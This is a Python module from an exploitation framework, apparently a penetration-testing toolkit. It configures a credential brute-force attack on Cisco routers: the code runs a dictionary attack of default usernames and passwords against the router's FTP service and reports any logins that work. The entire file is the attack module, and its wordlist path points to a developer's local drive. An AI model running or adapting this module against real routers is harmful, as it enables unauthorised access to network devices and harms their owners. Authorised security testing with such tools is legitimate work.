from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ftp_default import Exploit as FTPDefault


class Exploit(FTPDefault):
    __info__ = {
        "name": "Cisco Router Default FTP Creds",
        "description": "Module performs dictionary attack against Cisco Router FTP service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
        ),
        "devices": (
            "Cisco Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("file:///D:/Projetos-SafeLabs/submodules/IoT/FirewallXPL-Forge/firewallxpl/resources/wordlists/vendors/cisco_defaults.txt", "User:Pass or file with default credentials (file://)")
